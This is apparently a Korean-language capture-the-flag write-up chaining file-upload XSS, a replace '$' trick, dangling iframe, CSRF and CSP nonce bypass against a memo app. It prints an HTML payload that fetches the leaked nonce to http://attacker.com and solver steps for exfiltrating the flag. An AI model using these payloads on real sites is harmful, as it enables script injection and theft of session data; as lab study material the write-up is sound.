해당 문제는 XSS via file upload + replace trick + csrf + dangling iframe + CSP Bypass 기법을 사용해야 풀 수 있습니다.

먼저, 같은 세션에 대해 nonce가 고정되어 있기 때문에 nonce를 유출만 할 수 있다면 XSS를 트리거 하여 FLAG를 획득할 수 있습니다.
그러나, nonce를 유출하기 위해선 meta태그의 nonce를 갖고와야 합니다.
이때, content는 replace를 사용하여 갖고오고 있는데 이때 replace에서 $ 정규식을 사용한다는 점을 사용하여 nonce를 가져올 수 있습니다.
또한, dangling iframe을 사용하여 같은 127.0.0.1 url의 다른 port로 name값을 유출시킬 수 있습니다.
해당 페이로드는 아래와 같습니다.

<iframe name='$'$`

해당 페이로드를 사용하면 iframe name에 nonce 값이 담기고 file server에서 xss를 트리거 할 수 있다면 nonce를 외부로 유출할 수 있습니다.
이때, bot에서 csrf를 사용하여 admin 세션으로 memo를 업로드할 수 있습니다.

file server에서는 text/html로 해석되는 확장자들을 대부분 필터링하고 있습니다.
그러나, .html.br을 사용하여 이를 우회할 수 있습니다.

<!doctype html>
    <html>
    <iframe src="http://127.0.0.1:3000/memo/1" onload="cspBypass(this.contentWindow)"></iframe>
    <script>
        function cspBypass(win) {
            win[0].location = 'about:blank';
            setTimeout(() => {
                leaked = (win[0].name.match(/nonce=(["'])?([A-Za-z0-9+/=_-]+)/) || [])[2] || null;
                fetch('http://attacker.com/nonce?nonce='+leaked);
            }, 500);
    }</script>
    </html>


해당 코드가 담긴 악성 br파일을 만들어 file server에 업로드 후, 봇이 해당 파일에 접근하게 하면은 nonce를 attacker url로 유출할 수 있습니다.
이후 유출한 nonce를 사용하여 memo app에서 xss를 트리거 하면 되는데 content는 길이가 제한되어있기에 title에서 트리거 해야 합니다.
title값은 innerHTML로 담고 있는데 innerHTML에서는 script 구문 대신 iframe srcdoc을 활용하여 nonce를 담은 xss 페이로드를 트리거 할 수 있습니다.

solver 코드 단계는 다음과 같습니다.
1. app.py에서 ATTACKER 주소를 공격자 서버의 URL로 변경
2. 공격자 서버에 app.py 실행	=>`python3 app.py`
3. ex_file.py에서 ATTACKER_URL을 공격자 서버의 URL로 변경
4. ex_file.py로 악성 파일 생성 
5. 악성 파일 업로드 (아무 계정으로 로그인해서 파일 업로드)
6. bot에 app.py를 실행시켜놓은 공격자 서버 url 입력
7. 공격자 서버 로그로 flag 날아옴 => flag획득